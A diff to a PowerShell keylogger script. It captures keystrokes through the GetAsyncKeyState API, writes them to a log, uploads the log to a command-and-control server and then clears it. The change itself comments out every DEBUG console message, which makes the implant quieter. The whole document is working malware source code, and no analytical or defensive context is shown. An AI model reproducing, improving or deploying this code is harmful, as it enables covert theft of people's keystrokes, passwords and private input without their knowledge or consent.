@@ -20,7 +20,7 @@ function Write-Input
 	{
         Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Encountered an error trying to write to the input log. The error message is: " + $Error)
         Write-Console -Body ("Exception thrown trying to write to the input log. Exiting. Error: " + $Error) -IssueNumber $issueNumber
-		Write-Host ("DEBUG: Exception thrown trying to write to the input log. Exiting. Error: " + $Error); Start-Sleep -s 600
+		#Write-Host ("DEBUG: Exception thrown trying to write to the input log. Exiting. Error: " + $Error); Start-Sleep -s 600
 		Exit
 	}
 }
@@ -38,13 +38,13 @@ function Start-Logging
 	{
 		$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 		Write-Console -Body ("Loaded the GetAysncKeyState DLL OK. Logging...") -IssueNumber $issueNumber
-		Write-Host ("DEBUG: Loaded the GetAysncKeyState DLL OK. Logging...")
+		#Write-Host ("DEBUG: Loaded the GetAysncKeyState DLL OK. Logging...")
 	}
 	catch 
 	{
 		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error)
 		Write-Console -Body ("Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error) -IssueNumber $issueNumber
-		Write-Host ("DEBUG: Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error); Start-Sleep -s 600
+		#Write-Host ("DEBUG: Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Error: " + $Error); Start-Sleep -s 600
 		Exit
 	}
 	
@@ -68,14 +68,14 @@ function Start-Logging
 			{
 				Write-Input -Body $inputBuffer -IssueNumber $issueNumber
 				Write-Console -Body ("Wrote the input buffer to the input log. Clearing.") -IssueNumber $issueNumber
-				Write-Host ("DEBUG: Wrote the input buffer to the input log. Clearing.")
+				#Write-Host ("DEBUG: Wrote the input buffer to the input log. Clearing.")
 				$inputBuffer = ""
 			}
 			catch
 			{
 				Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error)
 				Write-Console -Body ("Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error) -IssueNumber $issueNumber
-				Write-Host ("DEBUG: Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error); Start-Sleep -s 600
+				#Write-Host ("DEBUG: Exception thrown trying to write input from the buffer to the log. Exiting. Error: " + $Error); Start-Sleep -s 600
 				Exit
 			}
 		}
@@ -106,7 +106,7 @@ function Start-Logging
 						}
 						$inputBuffer = ($inputBuffer + $i)
 						$writeOK[$i] = $false
-						Write-Host ("DEBUG: Wrote key code $i to log.")
+						#Write-Host ("DEBUG: Wrote key code $i to log.")
 					}
 				}
 				Else
@@ -118,7 +118,7 @@ function Start-Logging
 			{
 				Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown getting key state. Exiting. Error: " + $Error)
 				Write-Console -Body ("Exception thrown getting key state. Exiting. Error: " + $Error) -IssueNumber $issueNumber
-				Write-Host ("DEBUG: Exception thrown getting key state. Exiting. Error: " + $Error); Start-Sleep -s 600
+				#Write-Host ("DEBUG: Exception thrown getting key state. Exiting. Error: " + $Error); Start-Sleep -s 600
 				Exit
 			}
 		}
@@ -129,7 +129,7 @@ function Start-Logging
 #ENTRY POINT
 #Write startup message to console
 Write-Console -Body ("Input logger starting.") -IssueNumber $issueNumber
-Write-Host "DEBUG: Input logger starting."
+#Write-Host "DEBUG: Input logger starting."
 
 #Upload the input log to C2, then clear it.
 try 
@@ -141,16 +141,16 @@ try
 	If([System.IO.File]::Exists($inputLogPath))
 	{
 		Send-PackageMessage -Package "INPUT" -IssueNumber $issueNumber -Body (Get-Content -Path $inputLogPath -Raw)
-		Write-Host "DEBUG: Uploaded the input log to C2. Clearing it..."
+		#Write-Host "DEBUG: Uploaded the input log to C2. Clearing it..."
 		Clear-Content -Path $inputLogPath
 		Write-Console -Body "Uploaded the input log and cleared it." -IssueNumber $issueNumber
-		Write-Host "DEBUG: Cleared the old input log."
+		#Write-Host "DEBUG: Cleared the old input log."
 	}
 	Else
 	{
 		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Attempted to upload the input log, but was unable to find the file. Exiting.")
 		Write-Console -Body "Attempted to upload the input log, but was unable to find the file. Exiting." -IssueNumber $issueNumber
-		Write-Host "DEBUG: Attempted to upload the input log, but was unable to find the file. Exiting."; Start-Sleep -s 600
+		#Write-Host "DEBUG: Attempted to upload the input log, but was unable to find the file. Exiting."; Start-Sleep -s 600
 		Exit
 	}
 }
@@ -158,7 +158,7 @@ catch
 {
 	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the input log file. Exiting. Error: " + $Error)
 	Write-Console -Body "Exception thrown trying to upload the input log file. Notified C2. Exiting." -IssueNumber $issueNumber
-	Write-Host "DEBUG: Exception thrown trying to upload the input log file. Notified C2. Exiting."; Start-Sleep -s 600
+	#Write-Host "DEBUG: Exception thrown trying to upload the input log file. Notified C2. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -171,6 +171,6 @@ catch
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the logging function. Exiting. Error: " + $Error)
 	Write-Console -Body "Exception thrown trying to start the logging function. Notified C2. Exiting." -IssueNumber $issueNumber
-	Write-Host "DEBUG: Exception thrown trying to start the logging function. Notified C2. Exiting."; Start-Sleep -s 600
+	#Write-Host "DEBUG: Exception thrown trying to start the logging function. Notified C2. Exiting."; Start-Sleep -s 600
 	Exit
 }
